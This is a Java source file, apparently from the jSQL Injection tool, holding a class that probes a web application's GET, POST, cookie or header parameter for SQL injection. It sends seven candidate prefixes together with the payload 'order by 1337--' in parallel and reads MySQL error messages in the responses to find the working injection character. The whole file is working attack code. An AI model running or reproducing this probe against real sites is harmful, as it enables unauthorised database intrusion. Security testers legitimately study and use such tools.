package com.jsql.model;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.view.MediatorGUI;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class StoppableGetInsertionCharacter extends AbstractSuspendable {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(StoppableGetInsertionCharacter.class);

    @Override
    public String action(Object... args) throws PreparationException, StoppableException {
        // Has the url a query string?
        if ("GET".equalsIgnoreCase(MediatorGUI.model().method) && (MediatorGUI.model().getData == null || "".equals(MediatorGUI.model().getData))) {
            throw new PreparationException("No query string");
            // Is the query string well formed?
        } else if ("GET".equalsIgnoreCase(MediatorGUI.model().method) && MediatorGUI.model().getData.matches("[^\\w]*=.*")) {
            throw new PreparationException("Incorrect query string");
        } else if ("POST".equalsIgnoreCase(MediatorGUI.model().method) && MediatorGUI.model().postData.indexOf("=") < 0) {
            throw new PreparationException("Incorrect POST datas");
        } else if ("COOKIE".equalsIgnoreCase(MediatorGUI.model().method) && MediatorGUI.model().cookieData.indexOf("=") < 0) {
            throw new PreparationException("Incorrect COOKIE datas");
        } else if (!"".equals(MediatorGUI.model().headerData) && MediatorGUI.model().headerData.indexOf(":") < 0) {
            throw new PreparationException("Incorrect HEADER datas");
            // Parse query information: url=>everything before the sign '=',
            // start of query string=>everything after '='
        } else if ("GET".equalsIgnoreCase(MediatorGUI.model().method) && !MediatorGUI.model().getData.matches(".*=$")) {
            Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(MediatorGUI.model().getData);
            regexSearch.find();
            try {
                MediatorGUI.model().getData = regexSearch.group(1);
                return regexSearch.group(2);
            } catch (IllegalStateException e) {
                throw new PreparationException("Incorrect GET format");
            }
            // Parse post information
        } else if ("POST".equalsIgnoreCase(MediatorGUI.model().method) && !MediatorGUI.model().postData.matches(".*=$")) {
            Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(MediatorGUI.model().postData);
            regexSearch.find();
            try {
                MediatorGUI.model().postData = regexSearch.group(1);
                return regexSearch.group(2);
            } catch (IllegalStateException e) {
                throw new PreparationException("Incorrect POST format");
            }
            // Parse cookie information
        } else if ("COOKIE".equalsIgnoreCase(MediatorGUI.model().method) && !MediatorGUI.model().cookieData.matches(".*=$")) {
            Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(MediatorGUI.model().cookieData);
            regexSearch.find();
            try {
                MediatorGUI.model().cookieData = regexSearch.group(1);
                return regexSearch.group(2);
            } catch (IllegalStateException e) {
                throw new PreparationException("Incorrect Cookie format");
            }
            // Parse header information
        } else if ("HEADER".equalsIgnoreCase(MediatorGUI.model().method) && !MediatorGUI.model().headerData.matches(".*:$")) {
            Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(MediatorGUI.model().headerData);
            regexSearch.find();
            try {
                MediatorGUI.model().headerData = regexSearch.group(1);
                return regexSearch.group(2);
            } catch (IllegalStateException e) {
                throw new PreparationException("Incorrect Header format");
            }
        }

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<CallableSourceCode> taskCompletionService = new ExecutorCompletionService<CallableSourceCode>(taskExecutor);
        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)"}) {
            taskCompletionService.submit(new CallableSourceCode(insertionCharacter + "+order+by+1337--+", insertionCharacter));
        }

        int total = 7;
        while (0 < total) {
            // The user need to stop the job
            if (this.stopOrPause()) {
                throw new StoppableException();
            }
            try {
                CallableSourceCode currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                if (Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() 
                        || Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    // the correct character
                    return currentCallable.getInsertionCharacter();
                }
            } catch (InterruptedException e) {
                LOGGER.error(e, e);
            } catch (ExecutionException e) {
                LOGGER.error(e, e);
            }
        }

        // Nothing seems to work, forces 1 has the character
        return "1";
    }
}